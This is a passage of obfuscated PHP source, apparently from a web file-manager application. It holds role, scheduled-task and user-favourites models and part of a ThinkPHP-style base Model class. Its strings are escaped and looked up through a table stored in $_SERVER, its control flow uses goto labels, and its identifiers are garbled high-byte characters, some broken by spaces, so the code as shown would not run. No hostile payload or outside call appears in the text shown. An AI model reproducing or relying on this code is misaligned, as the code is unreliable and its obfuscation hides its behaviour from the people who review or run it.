FÄ‹ØÄ·µ: function binCheckBigger($°¼Ò‰©·, $¶×´Ìë…) { return $°¼Ò‰©· > $¶×´Ìë…; } $_SERVER[$_SERVER[¯ç‚ëƒ¸][3]] = ("\x38\x35\x30\x35"."\x38\x37")+0;$_h75i="dc4j08vhmbgaq9e2lx1tzrf56ipsu3yno7wk5r4amig1cy7xfhbu289p6ezvjoqsl0wd3knt8st7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($õ¦Ÿ·ÁÀ, $¶ß•Œ§š) { $…ïã”¦• =& $_SERVER[Ş­ğŠìÒ]; if (isset(self::$_methodList[$õ¦Ÿ·ÁÀ])) { return @call_user_func_array(self::$_methodList[$õ¦Ÿ·ÁÀ], $¶ß•Œ§š); } else { if (method_exists($this, $õ¦Ÿ·ÁÀ)) { return call_user_func_array(array($this, $õ¦Ÿ·ÁÀ), $¶ß•Œ§š); } else { think_exception(__CLASS__ . $…ïã”¦•[4] . $õ¦Ÿ·ÁÀ . $…ïã”¦•[5]); } } } public static function __callStatic($¾Ò¶‡ƒ, $¾ƒÏìËŒ) { if (isset(self::$_methodListStatic[$¾Ò¶‡ƒ])) { return call_user_func_array(self::$_methodListStatic[$¾Ò¶‡ƒ], $¾ƒÏìËŒ); } else { if (method_exists(self, $¾Ò¶‡ƒ)) { return call_user_func_array(array(self, $¾Ò¶‡ƒ), $¾ƒÏìËŒ); } else { show_json("{$¾Ò¶‡ƒ}\50\51\x20\156\157\x74\40\x65\x78\151\163\164\x3b", !1); } } } public static function addMethod($ôæ–Ñ·ß, $ÅÕâ½²) { self::$_methodList[$ôæ–Ñ·ß] = $ÅÕâ½²; } public static function addMethodStatic($¡…Åíó, $‘‹¿–Éõ) { self::$_methodListStatic[$¡…Åíó] = $‘‹¿–Éõ; } } goto D ¡îóìàÏ; a¦³Ã¿õ¯æ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\162\x6f\x6c\x65\x4c\151\163\x74"; public $field = array("\156\x61\155\145", "\x61\x75\x74\x68", "\x6c\141\x62\145\154", "\x64\x69\163\160\x6c\x61\171", "\x73\x79\x73\164\x65\x6d", "\x64\145\x73\143", "\151\x67\x6e\x6f\x72\x65\105\170\164", "\x69\147\x6e\x6f\162\145\106\151\154\x65\123\x69\x7a\x65", "\x61\x64\x6d\x69\156\151\163\164\162\x61\x74\x6f\x72", "\163\x6f\162\x74"); public function listData($´›³â×« = false, $è–€Ï®ì = "\163\x6f\x72\164", $®ºÁÖÀ£ = false) { $±ãû =& $_SERVER[Ş­ğŠìÒ]; $ñÇÂ„´§ = parent::listData($´›³â×«, $è–€Ï®ì, $®ºÁÖÀ£); if (!$´›³â×«) { foreach ($ñÇÂ„´§ as $ÉË† ò => $Â±·£ì«) { if ($Â±·£ì«[$±ãû[2171]] == 1) { $ñÇÂ„´§[$ÉË† ò][$±ãû[526]] = LNG($±ãû[2433]); } } } return $ñÇÂ„´§; } public function update($Å™åõı½, $¦è¸ˆÇŒ) { $—´Çˆ¡ =& $_SERVER[Ş­ğŠìÒ]; $úäÈ‚ê‚ = parent::listData($Å™åõı½); $ÀÌ‹òş› = $this->findByName($¦è¸ˆÇŒ[$—´Çˆ¡[32]]); if (!$úäÈ‚ê‚ || $ÀÌ‹òş› && $ÀÌ‹òş›[$—´Çˆ¡[475]] != $úäÈ‚ê‚[$—´Çˆ¡[475]]) { return !1; } if ($ÀÌ‹òş›[$—´Çˆ¡[2171]] == 1) { $¦è¸ˆÇŒ = array($—´Çˆ¡[32] => $¦è¸ˆÇŒ[$—´Çˆ¡[32]], $—´Çˆ¡[1986] => $¦è¸ˆÇŒ[$—´Çˆ¡[1986]]); } $this->filterAuth($¦è¸ˆÇŒ[$—´Çˆ¡[487]]); return parent::update($Å™åõı½, $¦è¸ˆÇŒ); } public function remove($ÔÎô¥œ£) { $§øÜÂï  = parent::listData($ÔÎô¥œ£); if (!$§øÜÂï  || $§øÜÂï [$_SERVER[Ş­ğŠìÒ][191]]) { return !1; } return parent::remove($ÔÎô¥œ£); } public function add($‘Ö÷ˆ¼‡) { $ã‘Î·•İ =& $_SERVER[Ş­ğŠìÒ]; $ŠÕ»î¢ë = $‘Ö÷ˆ¼‡[$ã‘Î·•İ[32]]; if ($this->findByName($ŠÕ»î¢ë)) { return !1; } $ä…Œı‚Ì = array($ã‘Î·•İ[494] => $ŠÕ»î¢ë, $ã‘Î·•İ[1969] => $ã‘Î·•İ[12], $ã‘Î·•İ[1965] => $ã‘Î·•İ[1973], $ã‘Î·•İ[2434] => 1, $ã‘Î·•İ[1968] => 0, $ã‘Î·•İ[2435] => 0, $ã‘Î·•İ[1967] => $this->getSort()); $‘Ö÷ˆ¼‡ = array_merge($ä…Œı‚Ì, $‘Ö÷ˆ¼‡); $this->filterAuth($‘Ö÷ˆ¼‡[$ã‘Î·•İ[487]]); return parent::insert($‘Ö÷ˆ¼‡); } private function getSort() { $÷ê‡Š½¼ =& $_SERVER[Ş­ğŠìÒ]; $—«ÀÅ™Å = parent::listData(); $½À¢İ  = array_to_keyvalue($—«ÀÅ™Å, $÷ê‡Š½¼[12], $÷ê‡Š½¼[1987]); return empty($½À¢İ ) ? 0 : max($½À¢İ ) + 1; } private function filterAuth(&$’øì²å¶) { $¥‚øÈ =& $_SERVER[Ş­ğŠìÒ]; $•ô¥•Ú = array(); $ªË«æ¦ = array_filter(explode($¥‚øÈ[50], $’øì²å¶)); foreach ($ªË«æ¦ as $’øì²å¶) { $Öóçšõş = explode($¥‚øÈ[10], $’øì²å¶); if ($Öóçšõş[0] == $¥‚øÈ[2436] && $Öóçšõş[1] != $¥‚øÈ[1271]) { $Ù’ı·ë = $Öóçšõş[0] . $¥‚øÈ[10] . $Öóçšõş[1] . $¥‚øÈ[2437]; if (!in_array($Ù’ı·ë, $ªË«æ¦)) { $•ô¥•Ú[] = $Ù’ı·ë; } } $•ô¥•Ú[] = $’øì²å¶; } $’øì²å¶ = implode($¥‚øÈ[50], $•ô¥•Ú); } public function findRoleDefault() { $İàº =& $_SERVER[Ş­ğŠìÒ]; $Õ´‹Åıê = parent::listData(); $İ»îü¾× = !1; foreach ($Õ´‹Åıê as $õ·©™¥¥) { if (!$õ·©™¥¥ || $õ·©™¥¥[$İàº[1985]] == $İàº[228] || $õ·©™¥¥[$İàº[2171]] == 1) { continue; } if (strstr($õ·©™¥¥[$İàº[487]], $İàº[2438])) { continue; } if (!strstr($õ·©™¥¥[$İàº[487]], $İàº[2439])) { continue; } if (!$İ»îü¾×) { $İ»îü¾× = $õ·©™¥¥; continue; } $œ®š’‰İ = explode($İàº[50], $İ»îü¾×[$İàº[487]]); $¬íôÏ¼ = explode($İàº[50], $õ·©™¥¥[$İàº[487]]); if (count($œ®š’‰İ) > count($¬íôÏ¼)) { $İ»îü¾× = $õ·©™¥¥; } } return $İ»îü¾× ? $İ»îü¾×[$İàº[475]] : $İàº[12]; } public function sort($Á”­í•¶, $®•ôİ¤ ) { return parent::update($Á”­í•¶, $®•ôİ¤ ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\164\141\163\153\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\164\171\160\145", "\x65\x76\145\156\x74", "\164\x69\155\145", "\144\x65\163\143", "\163\171\x73\x74\145\155", "\145\x6e\141\x62\154\x65", "\x6c\141\163\164\122\x75\x6e", "\x73\x6f\162\x74"); public function listData($¡ÁŒ”ªŒ = false, $Ó»àà·õ = "\163\x6f\162\164", $õ®ı‚ÜÂ = false) { return parent::listData($¡ÁŒ”ªŒ, $Ó»àà·õ, $õ®ı‚ÜÂ); } public function add($óæ–Ğ¨…) { $¬ûÏ‘› =& $_SERVER[Ş­ğŠìÒ]; $È³í™˜ä = $this->findByName($óæ–Ğ¨…[$¬ûÏ‘›[32]]); if ($È³í™˜ä) { return !1; } $óæ–Ğ¨…[$¬ûÏ‘›[1715]] = 0; $óæ–Ğ¨…[$¬ûÏ‘›[1987]] = $this->getSort(); return parent::insert($óæ–Ğ¨…); } private function getSort() { $²¨ËÄ± =& $_SERVER[Ş­ğŠìÒ]; $ÄÔßÎì³ = parent::listData(); $¥Íùî÷² = array_to_keyvalue($ÄÔßÎì³, $²¨ËÄ±[12], $²¨ËÄ±[1987]); return empty($¥Íùî÷²) ? 0 : max($¥Íùî÷²) + 1; } public function update($ÂµÂº¯•, $ôÚ“˜»¤) { $ŒÌ½ÑÒ§ =& $_SERVER[Ş­ğŠìÒ]; $––­“†Ï = $this->listData($ÂµÂº¯•); $Äã¦è÷ö = $this->findByName($ôÚ“˜»¤[$ŒÌ½ÑÒ§[32]]); if (!$––­“†Ï || $Äã¦è÷ö && $Äã¦è÷ö[$ŒÌ½ÑÒ§[475]] != $––­“†Ï[$ŒÌ½ÑÒ§[475]]) { return !1; } return parent::update($ÂµÂº¯•, $ôÚ“˜»¤); } public function remove($£àâ³ï¦, $ÔˆšÙ ° = false) { $“ÓÌè—­ =& $_SERVER[Ş­ğŠìÒ]; $äªãÖùÕ = $this->listData($£àâ³ï¦); if (!$äªãÖùÕ) { return; } if (!$ÔˆšÙ ° && $äªãÖùÕ[$“ÓÌè—­[191]] == $“ÓÌè—­[91]) { return !1; } return parent::remove($£àâ³ï¦); } public function enable($µ¬¦¨ş, $æ”û¸³) { return $this->update($µ¬¦¨ş, array($_SERVER[Ş­ğŠìÒ][2428] => $æ”û¸³)); } public function run($é¬ÄŸôº) { return $this->update($é¬ÄŸôº, array($_SERVER[Ş­ğŠìÒ][2440] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\141\x76"; protected function cacheFunctionAlias($ê€·­½) { $ˆ¶¿õú =& $_SERVER[Ş­ğŠìÒ]; return array($ˆ¶¿õú[2079] => array(USER_ID, $ˆ¶¿õú[2441])); } protected function listData() { $¹İ½×Ø =& $_SERVER[Ş­ğŠìÒ]; $Ó”ßÆÕÓ = array($¹İ½×Ø[1755] => USER_ID, $¹İ½×Ø[557] => 0); $¨à‹ë—ù = $¹İ½×Ø[2442]; $¬İóıŒµ = $this->field($¨à‹ë—ù)->where($Ó”ßÆÕÓ)->order($¹İ½×Ø[2443])->select(); return $¬İóıŒµ ? $¬İóıŒµ : array(); } protected function resetCache() { } protected function listView() { $†­ŸíÃ° =& $_SERVER[Ş­ğŠìÒ]; $¸Õ¾´ß = $this->listData(); $¹£¡ó—‚ = array_filter_by_field($¸Õ¾´ß, $†­ŸíÃ°[33], $†­ŸíÃ°[490]); $£ñ»Ò¥ = array_to_keyvalue($¹£¡ó—‚, $†­ŸíÃ°[12], $†­ŸíÃ°[87]); if (!$£ñ»Ò¥) { return $¸Õ¾´ß; } $–ÃÀÙáÕ = 2000; $úÜÔÇ” = array($†­ŸíÃ°[491] => array($†­ŸíÃ°[492], $£ñ»Ò¥)); $¸ô¹ÈØò = Model($†­ŸíÃ°[891])->listSource($úÜÔÇ”, $–ÃÀÙáÕ); $¸ô¹ÈØò = array_merge($¸ô¹ÈØò[$†­ŸíÃ°[86]], $¸ô¹ÈØò[$†­ŸíÃ°[85]]); $¸ô¹ÈØò = array_to_keyvalue($¸ô¹ÈØò, $†­ŸíÃ°[193]); foreach ($¸Õ¾´ß as $æ€¨¦€š => $ÛÇ½Õä) { $‘ïïÖÊ = $¸ô¹ÈØò[$ÛÇ½Õä[$†­ŸíÃ°[87]]]; $‘ïïÖÊ = $‘ïïÖÊ ? $‘ïïÖÊ : array(); $¸Õ¾´ß[$æ€¨¦€š] = array_merge($‘ïïÖÊ, $ÛÇ½Õä); } return $¸Õ¾´ß; } protected function addFav($²ÊëÊ¦, $¯Î¬¹ÏÎ = '', $„Ø¿’ƒä = "\x73\157\165\162\143\x65") { $Ö¼Ã´¸Õ =& $_SERVER[Ş­ğŠìÒ]; $Ñšû±Ğ = array($Ö¼Ã´¸Õ[1755] => USER_ID, $Ö¼Ã´¸Õ[557] => 0, $Ö¼Ã´¸Õ[496] => $„Ø¿’ƒä, $Ö¼Ã´¸Õ[495] => $²ÊëÊ¦); if ($this->where($Ñšû±Ğ)->find()) { return !1; } $Ñšû±Ğ = array($Ö¼Ã´¸Õ[1755] => USER_ID, $Ö¼Ã´¸Õ[557] => 0); $ÇûƒŠŞ— = $this->where($Ñšû±Ğ)->max($Ö¼Ã´¸Õ[1987]); if (!$ÇûƒŠŞ—) { $ÇûƒŠŞ— = 0; } if (!$¯Î¬¹ÏÎ && $„Ø¿’ƒä == $Ö¼Ã´¸Õ[490]) { $ğö Èƒ = Model($Ö¼Ã´¸Õ[1414])->where(array($Ö¼Ã´¸Õ[491] => $²ÊëÊ¦))->find(); if (!$ğö Èƒ) { return !1; } $¯Î¬¹ÏÎ = $ğö Èƒ[$Ö¼Ã´¸Õ[32]]; } $¯Î¬¹ÏÎ = $this->getAutoName($¯Î¬¹ÏÎ); $‰¼¯ëÊ´ = array($Ö¼Ã´¸Õ[1755] => USER_ID, $Ö¼Ã´¸Õ[557] => 0, $Ö¼Ã´¸Õ[494] => $¯Î¬¹ÏÎ, $Ö¼Ã´¸Õ[495] => $²ÊëÊ¦, $Ö¼Ã´¸Õ[496] => $„Ø¿’ƒä, $Ö¼Ã´¸Õ[1967] => $ÇûƒŠŞ— + 1); return $this->add($‰¼¯ëÊ´); } protected function remove($©†ñòÉ) { $©¥ğ‡­ =& $_SERVER[Ş­ğŠìÒ]; $¹¨”øµ = array($©¥ğ‡­[1755] => USER_ID, $©¥ğ‡­[493] => $©†ñòÉ); return $this->where($¹¨”øµ)->delete(); } protected function removeByName($ï‰ºìÄÉ) { $†¬÷—Ò‡ =& $_SERVER[Ş­ğŠìÒ]; $õ…‰¾î = array($†¬÷—Ò‡[1755] => USER_ID, $†¬÷—Ò‡[494] => $ï‰ºìÄÉ, $†¬÷—Ò‡[557] => 0); return $this->where($õ…‰¾î)->delete(); } protected function rename($®ûÉƒÀè, $¤Ğ€‰÷è) { $è‹ôàı =& $_SERVER[Ş­ğŠìÒ]; if ($®ûÉƒÀè == $¤Ğ€‰÷è) { return !1; } $ùÎò æ® = $this->getAutoName($¤Ğ€‰÷è); if ($¤Ğ€‰÷è != $ùÎò æ®) { return !1; } $î«­Æ±Œ = array($è‹ôàı[1755] => USER_ID, $è‹ôàı[557] => 0, $è‹ôàı[32] => $®ûÉƒÀè); return $this->where($î«­Æ±Œ)->save(array($è‹ôàı[32] => $¤Ğ€‰÷è)); } protected function resetSort($¹ıèùå†) { $Âï²’„‚ =& $_SERVER[Ş­ğŠìÒ]; $¹ıèùå† = is_array($¹ıèùå†) ? $¹ıèùå† : array(); $¼ÓŸÚüÏ = array($Âï²’„‚[1755] => USER_ID); for ($‡Ëã„Ş« = 0; $‡Ëã„Ş« < count($¹ıèùå†); $‡Ëã„Ş«++) { $¼ÓŸÚüÏ[$Âï²’„‚[493]] = $¹ıèùå†[$‡Ëã„Ş«]; $this->where($¼ÓŸÚüÏ)->save(array($Âï²’„‚[1967] => $‡Ëã„Ş« + 1)); } return !0; } protected function moveTop($Šşµ§í) { $ü¹Š£ó =& $_SERVER[Ş­ğŠìÒ]; $ÓœŒ€îì = array($ü¹Š£ó[1755] => USER_ID, $ü¹Š£ó[557] => 0); $¤¡æ‡åª = $this->where($ÓœŒ€îì)->where(array($ü¹Š£ó[32] => $Šşµ§í))->find(); if (!$¤¡æ‡åª) { return; } $¶Æƒúùß = $this->field($ü¹Š£ó[475])->where($ÓœŒ€îì)->order($ü¹Š£ó[2443])->select(); $¶Æƒúùß = array_to_keyvalue($¶Æƒúùß, $ü¹Š£ó[12], $ü¹Š£ó[475]); $øúÃéèÑ = $¶Æƒúùß; $¶Æƒúùß = array_remove_value($¶Æƒúùß, $¤¡æ‡åª[$ü¹Š£ó[475]]); array_unshift($¶Æƒúùß, $¤¡æ‡åª[$ü¹Š£ó[475]]); return $this->resetSort($¶Æƒúùß); } protected function moveBottom($¡ñé•Äã) { $çªÌıÊ =& $_SERVER[Ş­ğŠìÒ]; $àšÇ¸× = array($çªÌıÊ[1755] => USER_ID, $çªÌıÊ[557] => 0); $×•Şáúª = $this->where($àšÇ¸×)->max($çªÌıÊ[1987]); $ì™‘‘ô¨ = array($çªÌıÊ[1987] => $×•Şáúª + 1); return $this->where($àšÇ¸×)->where(array($çªÌıÊ[32] => $¡ñé•Äã))->save($ì™‘‘ô¨); } private function getAutoName($‘Î»œ¨ù) { $¡‡ö××Ğ =& $_SERVER[Ş­ğŠìÒ]; $Ä”Â®”ã = array($¡‡ö××Ğ[1755] => USER_ID, $¡‡ö××Ğ[557] => 0); $»ç÷ÔƒÇ = $this->field($¡‡ö××Ğ[32])->where($Ä”Â®”ã)->select(); $»ç÷ÔƒÇ = array_to_keyvalue($»ç÷ÔƒÇ, $¡‡ö××Ğ[12], $¡‡ö××Ğ[32]); if (!$»ç÷ÔƒÇ || !in_array($‘Î»œ¨ù, $»ç÷ÔƒÇ)) { return $‘Î»œ¨ù; } for ($ˆ—±ûÎ¤ = 0; $ˆ—±ûÎ¤ < count($»ç÷ÔƒÇ); $ˆ—±ûÎ¤++) { if (!in_array($‘Î»œ¨ù . "\50{$ˆ—±ûÎ¤}\51", $»ç÷ÔƒÇ)) { return $‘Î»œ¨ù . "\x28{$ˆ—±ûÎ¤}\x29"; } } return $‘Î»œ¨ù . "\50{$ˆ—±ûÎ¤}\x29"; } } goto BæŞ ôèä; f‹ÈÒöÕƒÄ: define($_SERVER[Ş­ğŠìÒ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\157\162\x64\x65\162", "\141\x6c\151\x61\163", "\150\141\166\151\x6e\x67", "\147\x72\x6f\x75\x70", "\154\157\143\153", "\144\x69\x73\x74\x69\x6e\143\x74", "\x61\165\x74\x6f", "\x66\151\154\164\145\x72", "\x76\x61\x6c\151\144\x61\164\145", "\162\x65\x73\x75\154\x74", "\x62\151\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($µò¥¥Ñ = '', $şØÅÚŒĞ = '', $¢ÀĞ•È = '') { $ë™Ü¥â =& $_SERVER[Ş­ğŠìÒ]; $this->_initialize(); if (!empty($µò¥¥Ñ)) { if (strpos($µò¥¥Ñ, $ë™Ü¥â[10])) { list($this->dbName, $this->name) = explode($ë™Ü¥â[10], $µò¥¥Ñ); } else { $this->name = $µò¥¥Ñ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($şØÅÚŒĞ)) { $this->tablePrefix = $ë™Ü¥â[12]; } elseif ($ë™Ü¥â[12] != $şØÅÚŒĞ) { $this->tablePrefix = $şØÅÚŒĞ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ë™Ü¥â[321]); } $this->db(0, empty($this->connection) ? $¢ÀĞ•È : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $©²‘ú™Û =& $_SERVER[Ş­ğŠìÒ]; if (empty($this->fields)) { if (think_config($©²‘ú™Û[322])) { $¢Ê¢á«À = $this->dbName ? $this->dbName : think_config($©²‘ú™Û[323]); $æ›ÙÖ¼ñ = think_var_cache($©²‘ú™Û[324] . strtolower(get_path_this($¢Ê¢á«À) . $©²‘ú™Û[10] . $this->name)); if ($æ›ÙÖ¼ñ) { $×Ë‚÷¡õ = think_config($©²‘ú™Û[325]); if (empty($×Ë‚÷¡õ) || $æ›ÙÖ¼ñ[$©²‘ú™Û[326]] == $×Ë‚÷¡õ) { $this->fields = $æ›ÙÖ¼ñ; return; } } } $this->flush(); } } public function flush() { $ÙÃ¼û‡´ =& $_SERVER[Ş­ğŠìÒ]; $this->db->setModel($this->name); $Š©ÛÒÔî = $this->db->getFields($this->getTableName()); if (!$Š©ÛÒÔî) { return !1; } $this->fields = array_keys($Š©ÛÒÔî); $this->fields[$ÙÃ¼û‡´[327]] = !1; foreach ($Š©ÛÒÔî as $ÊÆÚíÍ® => $Ö…Öš”Ô) { $€ÔõáÚ[$ÊÆÚíÍ®] = $Ö…Öš”Ô[$ÙÃ¼û‡´[33]]; if ($Ö…Öš”Ô[$ÙÃ¼û‡´[39]]) { $this->fields[$ÙÃ¼û‡´[328]] = $ÊÆÚíÍ®; if ($Ö…Öš”Ô[$ÙÃ¼û‡´[42]]) { $this->fields[$ÙÃ¼û‡´[327]] = !0; } } } $this->fields[$ÙÃ¼û‡´[329]] = $€ÔõáÚ; if (think_config($ÙÃ¼û‡´[325])) { $this->fields[$ÙÃ¼û‡´[326]] = think_config($ÙÃ¼û‡´[325]); } if (think_config($ÙÃ¼û‡´[322])) { $¦×™ÀçÖ = $this->dbName ? $this->dbName : think_config($ÙÃ¼û‡´[323]); think_var_cache($ÙÃ¼û‡´[324] . strtolower(get_path_this($¦×™ÀçÖ) . $ÙÃ¼û‡´[10] . $this->name), $this->fields); } } public function switchModel($’ôáä, $ŞßşÅ¿É = array()) { $–«·–£ó =& $_SERVER[Ş­ğŠìÒ]; $§ç£ ­Á = ucwords(strtolower($’ôáä)) . $–«·–£ó[330]; if (!class_exists($§ç£ ­Á)) { think_exception($§ç£ ­Á . think_lang($–«·–£ó[331])); } $this->_extModel = new $§ç£ ­Á($this->name); if (!empty($ŞßşÅ¿É)) { foreach ($ŞßşÅ¿É as $À¢ùÒô°) { $this->_extModel->setProperty($À¢ùÒô°, $this->{$À¢ùÒô°}); } } return $this->_extModel; } public function __set($£ç¸û”Ó, $¹”Óù¹µ) { $this->data[$£ç¸û”Ó] = $¹”Óù¹µ; } public function __get($ª÷ò°¡°) { return isset($this->data[$ª÷ò°¡°]) ? $this->data[$ª÷ò°¡°] : null; } public function __isset($˜İõîá¨) { return isset($this->data[$˜İõîá¨]); } public function __unset($ñÆ¸Â¸Õ) { unset($this->data[$ñÆ¸Â¸Õ]); } public function __call($ĞÍ±è·, $ßöÓœü¶) { $¶°Á¼»œ =& $_SERVER[Ş­ğŠìÒ]; if (in_array(strtolower($ĞÍ±è·), $this->methods, !0)) { $this->options[strtolower($ĞÍ±è·)] = $ßöÓœü¶[0]; return $this; } elseif (in_array(strtolower($ĞÍ±è·), array($¶°Á¼»œ[332], $¶°Á¼»œ[333], $¶°Á¼»œ[334], $¶°Á¼»œ[335], $¶°Á¼»œ[336]), !0)) { $¸¨ÔÊ‹Ì = isset($ßöÓœü¶[0]) ? $ßöÓœü¶[0] : $¶°Á¼»œ[220]; $¸¨ÔÊ‹Ì = $this->db->parseKey($¸¨ÔÊ‹Ì); return $this->getField(strtoupper($ĞÍ±è·) . $¶°Á¼»œ[337] . $¸¨ÔÊ‹Ì . $¶°Á¼»œ[338] . $ĞÍ±è·, $¶°Á¼»œ[332]); } elseif (strtolower(substr($ĞÍ±è·, 0, 5)) == $¶°Á¼»œ[339]) { $¸¨ÔÊ‹Ì = think_parse_name(substr($ĞÍ±è·, 5)); $ÄŸöŒĞ¯[$¸¨ÔÊ‹Ì] = $ßöÓœü¶[0]; return $this->where($ÄŸöŒĞ¯)->find(); } elseif (strtolower(substr($ĞÍ±è·, 0, 10)) == $¶°Á¼»œ[340]) { $©ğ¥Ü»Õ = think_parse_name(substr($ĞÍ±è·, 10)); $ÄŸöŒĞ¯[$©ğ¥Ü»Õ] = $ßöÓœü¶[0]; return $this->where($ÄŸöŒĞ¯)->getField($ßöÓœü¶[1]); } elseif (isset($this->_scope[$ĞÍ±è·])) { return $this->scope($ĞÍ±è·, $ßöÓœü¶[0]); } elseif (method_exists($this, $ĞÍ±è·)) { array_unshift($ßöÓœü¶, $ĞÍ±è·); return call_user_func_array(array($this, $¶°Á¼»œ[341]), $ßöÓœü¶); } else { return call_user_func_array(array(parent, $ĞÍ±è·), $ßöÓœü¶); } } protected function call() { $‰É¸´“Ã =& $_SERVER[Ş­ğŠìÒ]; $©ÌäÛÏ€ = func_get_args(); $éñ¾Çœê = array_shift($©ÌäÛÏ€); $Ö»çà¢Ú = $éñ¾Çœê; if (is_array($éñ¾Çœê)) { $Ö»çà¢Ú = $éñ¾Çœê[1]; $éñ¾Çœê = $éñ¾Çœê[0]; } $ï˜®ã­¢ = count($©ÌäÛÏ€) - 1; if (isset($©ÌäÛÏ€[$ï˜®ã­¢]) && $©ÌäÛÏ€[$ï˜®ã­¢] === $éñ¾Çœê) { think_exception(__CLASS__ . $‰É¸´“Ã[4] . $éñ¾Çœê . think_lang($‰É¸´“Ã[342])); return; } $©ÌäÛÏ€[] = $éñ¾Çœê; if (method_exists($this, $‰É¸´“Ã[343])) { $›àØ€“ñ = call_user_func_array(array($this, $‰É¸´“Ã[344]), array($Ö»çà¢Ú, $©ÌäÛÏ€)); if (!is_null($›àØ€“ñ) && $›àØ€“ñ !== !1) { return $›àØ€“ñ; } } $œğÓâ¥ = call_user_func_array(array($this, $éñ¾Çœê), $©ÌäÛÏ€); if (method_exists($this, $‰É¸´“Ã[345])) { $›àØ€“ñ = call_user_func_array(array($this, $‰É¸´“Ã[346]), array($Ö»çà¢Ú, $©ÌäÛÏ€, $œğÓâ¥)); if ($›àØ€“ñ) { return $›àØ€“ñ; } } return $œğÓâ¥; } protected function _initialize() { } protected function _facade($úæÒ”Â‰) { $–Š’Î« =& $_SERVER[Ş­ğŠìÒ]; if (!empty($this->fields)) { foreach ($úæÒ”Â‰ as $î¤æÍŒ´ => $ë†«Â´ñ) { if (is_array($this->fields) && !in_array($î¤æÍŒ´, $this->fields, !0)) { unset($úæÒ”Â‰[$î¤æÍŒ´]); } elseif (is_scalar($ë†«Â´ñ)) { $this->_parseType($úæÒ”Â‰, $î¤æÍŒ´); } } } if (!empty($this->options[$–Š’Î«[347]])) { $úæÒ”Â‰ = array_map($this->options[$–Š’Î«[347]], $úæÒ”Â‰); unset($this->options[$–Š’Î«[347]]); } $this->_beforeWrite($úæÒ”Â‰); return $úæÒ”Â‰; } protected function _beforeWrite(&$Œàç³¯ú) { } public function add($Ÿ‰·ƒÆœ = '', $ÕÜÃÚ¹Æ = array(), $ôùÒœ¢ = false) { if (empty($Ÿ‰·ƒÆœ)) { if (!empty($this->data)) { $Ÿ‰·ƒÆœ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ş­ğŠìÒ][348]); return !1; } } $ÕÜÃÚ¹Æ = $this->_parseOptions($ÕÜÃÚ¹Æ); $Ÿ‰·ƒÆœ = $this->_facade($Ÿ‰·ƒÆœ); if (!1 === $this->_beforeInsert($Ÿ‰·ƒÆœ, $ÕÜÃÚ¹Æ)) { return !1; } $‚½ò¸ìÜ = $this->db->insert($Ÿ‰·ƒÆœ, $ÕÜÃÚ¹Æ, $ôùÒœ¢); if (!1 !== $‚½ò¸ìÜ) { $ÔµõÕŒØ = $this->getLastInsID(); if ($ÔµõÕŒØ) { $Ÿ‰·ƒÆœ[$this->getPk()] = $ÔµõÕŒØ; $this->_after_insert($Ÿ‰·ƒÆœ, $ÕÜÃÚ¹Æ); return $ÔµõÕŒØ; } $this->_after_insert($Ÿ‰·ƒÆœ, $ÕÜÃÚ¹Æ); } return $‚½ò¸ìÜ; } protected function _beforeInsert(&$ĞÂêëÖ, $«¬¨§ëß) { } protected function _after_insert($À±“ßÚ¥, $Šß²›Ã”) { } public function addAll($ö³¹±š, $¥±¼Ûô = array(), $Ó÷ãš„ = false) { $½ªµâ²¼ =& $_SERVER[Ş­ğŠìÒ]; if (empty($ö³¹±š)) { $this->error = think_lang($½ªµâ²¼[348]); return !1; } $¥±¼Ûô = $this->_parseOptions($¥±¼Ûô); foreach ($ö³¹±š as $³™¬¿Óí => $”íÉÀ™¯) { $ö³¹±š[$³™¬¿Óí] = $this->_facade($”íÉÀ™¯); } if (method_exists($this->db, $½ªµâ²¼[349])) { $¡¸úšÉÓ = $this->db->insertAll($ö³¹±š, $¥±¼Ûô, $Ó÷ãš„); } else { $this->startTrans(); foreach ($ö³¹±š as $³™¬¿Óí => $”íÉÀ™¯) { $¡¸úšÉÓ = $this->db->insert($”íÉÀ™¯, $¥±¼Ûô, $Ó÷ãš„); } $this->commit(); } if (!1 !== $¡¸úšÉÓ) { $³ãõ¶“ = $this->getLastInsID(); if ($³ãõ¶“) { return $³ãõ¶“; } } return $¡¸úšÉÓ; } public function selectAdd($×ì²Íï = '', $ê·¢ö‚ú = '', $”—åŸêä = array()) { $ŸÂÉ”€„ =& $_SERVER[Ş­ğŠìÒ]; $”—åŸêä = $this->_parseOptions($”—åŸêä); if (!1 === ($éâ¬Œº = $this->db->selectInsert($×ì²Íï ? $×ì²Íï : $”—åŸêä[$ŸÂÉ”€„[350]], $ê·¢ö‚ú ? $ê·¢ö‚ú : $this->getTableName(), $”—åŸêä))) { $this->error = think_lang($ŸÂÉ”€„[351]); return !1; } else { return $éâ¬Œº; } } public function save($ŒÙ¡ˆû¿ = '', $Ö·…ğ•é = array()) { $°ş›÷¶Ú =& $_SERVER[Ş­ğŠìÒ]; if (empty($ŒÙ¡ˆû¿)) { if (!empty($this->data)) { $ŒÙ¡ˆû¿ = $this->data; $this->data = array(); } else { $this->error = think_lang($°ş›÷¶Ú[348]); return !1; } } $ŒÙ¡ˆû¿ = $this->_facade($ŒÙ¡ˆû¿); $Ö·…ğ•é = $this->_parseOptions($Ö·…ğ•é); $»ìñØí = $this->getPk(); if (!isset($Ö·…ğ•é[$°ş›÷¶Ú[352]])) { if (isset($ŒÙ¡ˆû¿[$»ìñØí])) { 